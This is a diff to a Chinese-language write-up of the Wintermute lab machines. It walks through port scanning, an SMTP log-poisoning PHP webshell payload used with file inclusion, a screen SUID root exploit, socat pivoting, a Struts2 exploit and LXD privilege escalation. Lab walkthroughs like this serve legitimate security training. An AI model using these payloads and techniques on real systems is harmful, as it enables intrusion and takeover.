@@ -50,16 +50,18 @@ KALI (Network #1)
 -----------------------------------------------------------------------------------
 ~~~
 大体的拓扑图如下
-![](./Pasted image 20241104163034.png)
+![](./Pasted_image_20241104163034.png)
 在virtualbox中导入，其实是会自动配好网络的，保险起见多检查一下
 kali
-![](./Pasted image 20241104163439.png)
+![](./Pasted_image_20241104163439.png)
 STRAYLIGHT
-![](./Pasted image 20241104163510.png)
+![](./Pasted_image_20241104163510.png)
 NEUROMANCER
-![](./Pasted image 20241104163528.png)
-# 端口扫描-STRAYLIGHT
-![](./Pasted image 20241104164441.png)
+![](./Pasted_image_20241104163528.png)
+## 信息收集
+
+### STRAYLIGHT 端口扫描
+![](./Pasted_image_20241104164441.png)
 STRAYLIGHT的IP为192.168.56.102
 ### 全端口扫描
 ~~~
@@ -184,9 +186,9 @@ MAC Address: 08:00:27:DE:F9:85 (Oracle VirtualBox virtual NIC)
 Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
 
 ~~~
-# 80(web)
+### Web 信息收集
 访问给出了一些信息
-![](./Pasted image 20241104165221.png)
+![](./Pasted_image_20241104165221.png)
 稍微做些信息搜集 
 ~~~
 Armitage
@@ -227,33 +229,37 @@ Finished
 ~~~
 看了一下freeside这个目录，没有发现什么有价值的信息，背景图片也没有隐写
 因此80端口先放着，看一下3000端口
-# 3000(web)
+### Web 3000 (ntop) 信息收集
 进来是一个登录页
-![](./Pasted image 20241105185110.png)
+![](./Pasted_image_20241105185110.png)
 试了一下admin::admin就直接进去了
-![](./Pasted image 20241105185221.png)
+![](./Pasted_image_20241105185221.png)
 查一下ntop是什么
-![](./Pasted image 20241105185329.png)
+![](./Pasted_image_20241105185329.png)
 似乎是一款流量监测工具，想办法查看一下版本
-![](./Pasted image 20241105193819.png)
+![](./Pasted_image_20241105193819.png)
 发现版本为2.4.180512找一下有没有可以利用的漏洞
 找了一圈似乎没有可利用的
 发现有两个网络接口
 这是我们kali所在的网段
-![](./Pasted image 20241105191735.png)
+![](./Pasted_image_20241105191735.png)
 这应该就是机器的内网
-![](./Pasted image 20241105191850.png)
+![](./Pasted_image_20241105191850.png)
 
 找啊找，终于在这里发现了被访问过目录的痕迹
-![](./Pasted image 20241105211350.png)
+![](./Pasted_image_20241105211350.png)
 在80端口访问得到以下界面
-![](./Pasted image 20241105211525.png)
+![](./Pasted_image_20241105211525.png)
 submit之后
-![](./Pasted image 20241105214814.png)
+![](./Pasted_image_20241105214814.png)
 可以合理怀疑有文件包含漏洞
-![](./Pasted image 20241105214842.png)
+![](./Pasted_image_20241105214842.png)
 因为这台服务器上开启了smtp，应该想到去查看他的mail.log(可惜我没想到)
-![](./Pasted image 20241105214752.png)
+![](./Pasted_image_20241105214752.png)
+## 漏洞利用
+
+### SMTP 日志投毒 RCE
+
 接下来我们尝试往日志里注入恶意代码
 发送邮件
 ~~~
@@ -279,13 +285,15 @@ subject:<?php phpinfo();system($_GET['cmd']);?>
 ~~~
 配合包含/var/log/mail.log即可RCE
 可以看到phpinfo被解析了，那我们可以传入命令了
-![](./Pasted image 20241105221426.png)
+![](./Pasted_image_20241105221426.png)
 id测试是否可用
-![](./Pasted image 20241105221650.png)
+![](./Pasted_image_20241105221650.png)
 可以用，那我们传入反弹shell
-![](./Pasted image 20241105221943.png)
+![](./Pasted_image_20241105221943.png)
 拿到shell！！！
-# STRAYLIGHT提权
+## 权限提升
+
+### Screen SUID 提权
 有以下几个用户
 ~~~
 turing-police
@@ -293,19 +301,19 @@ postgres
 wintermute
 ~~~
 查看suid权限
-![](./Pasted image 20241106144828.png)
+![](./Pasted_image_20241106144828.png)
 发现有screen的suid权限，这是不常见的
 尝试在GTFO-bins上搜索，无果
 试一下找一下提权漏洞
-![](./Pasted image 20241106144937.png)
+![](./Pasted_image_20241106144937.png)
 下载41154.sh
 成功提权！
-![](./Pasted image 20241106145136.png)
+![](./Pasted_image_20241106145136.png)
 在root目录找到一些信息，给我们提供了一个目录/struts2_2.3.15.1-showcase
-![](./Pasted image 20241106145306.png)
-# 内网渗透
+![](./Pasted_image_20241106145306.png)
+## 内网渗透 (Neuromancer)
 粗略的扫描了一下内网的机器
-![](./Pasted image 20241106132755.png)
+![](./Pasted_image_20241106132755.png)
 发现有一台机器的8080端口是开放的，应该就是我们的内网机器
 对他进行详细端口扫描，查看哪些端口是开放的
 AI写的脚本
@@ -350,9 +358,9 @@ socat -ddd TCP-LISTEN:8010,fork TCP:192.168.58.4:8009 &> /dev/null &
 socat -ddd TCP-LISTEN:8081,fork TCP:192.168.58.4:8080 &> /dev/null &
 socat -ddd TCP-LISTEN:34484,fork TCP:192.168.58.4:34483 &> /dev/null &
 ~~~
-![](./Pasted image 20241106135815.png)
+![](./Pasted_image_20241106135815.png)
 端口转发成功建立，在web端访问一下8081试试
-![](./Pasted image 20241106135846.png)
+![](./Pasted_image_20241106135846.png)
 成功
 枚举一下内网机器192.168.58.4的服务
 ### 版本扫描
@@ -437,7 +445,7 @@ Finished
 ===============================================================
 ~~~
 先前我们得到了一个目录，访问一下
-![](./Pasted image 20241106145729.png)
+![](./Pasted_image_20241106145729.png)
 找到一个上传文件的入口
 
 在starylight上设置一个反向端口转发
@@ -446,30 +454,30 @@ socat -ddd TCP-LISTEN:5555,fork TCP:192.168.56.101:4444 &> /dev/null &
 ~~~
 以便反弹shell
 发现有RCE，但是这个需要requests库，而我们的靶机上没有，只能寻找其他利用
-![](./Pasted image 20241106151736.png)
+![](./Pasted_image_20241106151736.png)
 找到了可利用的[exp](https://github.com/rapid7/metasploit-framework/issues/8064)
-![](./Pasted image 20241106154240.png)
+![](./Pasted_image_20241106154240.png)
 先把shell弹回来
-![](./Pasted image 20241106155452.png)
+![](./Pasted_image_20241106155452.png)
 搜集一下信息
 在tomcat-users.xml中找到登录凭据
-![](./Pasted image 20241106161710.png)
+![](./Pasted_image_20241106161710.png)
 是HTML硬编码，解码得到
-![](./Pasted image 20241106161841.png)
+![](./Pasted_image_20241106161841.png)
 ~~~
 >!Xx3JanexX!<
 ~~~
 ssh连接
-![](./Pasted image 20241106162102.png)
+![](./Pasted_image_20241106162102.png)
 一番枚举后没发现什么信息，回过头看看
-![](./Pasted image 20241106164420.png)
+![](./Pasted_image_20241106164420.png)
 发现ta在lxd组中
 参考这篇[文章](https://reboare.github.io/lxd/lxd-escape.html)，我们进行提权
 在这之前，我们先使我们可以ssh登录ta用户（ssh-keygen）
-![](./Pasted image 20241106171439.png)
+![](./Pasted_image_20241106171439.png)
 先下载一个镜像https://github.com/saghul/lxd-alpine-builder.git
 用scp把文件上传上去
-![](./Pasted image 20241106172341.png)
+![](./Pasted_image_20241106172341.png)
 lxd提权
 ~~~
 ta@neuromancer:/tmp$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias lizi
@@ -510,4 +518,4 @@ root
 
 ~~~
 至此提权成功
-![](./Pasted image 20241106173441.png)
+![](./Pasted_image_20241106173441.png)
